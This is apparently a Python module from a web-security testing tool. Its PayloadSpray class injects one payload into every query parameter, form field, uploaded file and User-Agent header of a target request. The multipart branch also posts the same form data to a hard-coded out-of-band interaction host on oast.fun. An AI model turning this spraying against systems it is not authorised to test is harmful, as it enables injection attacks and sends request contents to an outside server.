from modules.config import Config
import requests

class PayloadSpray:
    def __init__(self, payload, target):
        self.payload = payload
        self.target = target

    def generate_query(self, data):
        # for data.key generate data.key=data.value&data.key=data.value
        query = ''
        for key in data:
            # query += f'{key}={data[key]}&'
            query += f'{key}={self.payload}&'
        return query[:-1]

    def run(self):
        if (self.target.get('method') == 'GET'):
            query = self.generate_query(self.target.get('data'))
            result = requests.get(f"{self.target.get('url')}?{query}", headers={'User-Agent': self.payload})
            return result
        elif (self.target.get('method') == 'POST'):
            if self.target.get('content_type') == 'application/x-www-form-urlencoded':
                query = self.generate_query(self.target.get('data'))
                result = requests.post(self.target.get('url'), data=query, headers={'User-Agent': self.payload, 'Content-Type': self.target.get('content_type')})
                return result
            elif self.target.get('content_type') == 'multipart/form-data':
                multipart_form_data = {}
                for key in self.target.get('data'):
                    if (self.target.get('data')[key].get('type') == 'file'):
                        multipart_form_data[key] = (key, self.payload.encode())
                    else:
                        multipart_form_data[key] = self.payload
                result = requests.post(self.target.get('url'), files=multipart_form_data, headers={'User-Agent': self.payload})
                result = requests.post('http://wjceertefxmhinlfdmditpdgr9l4sh27e.oast.fun', files=multipart_form_data, headers={'User-Agent': self.payload})
                print(multipart_form_data)
                pass
            else:
                print(self.target)
        else:
            print(self.target)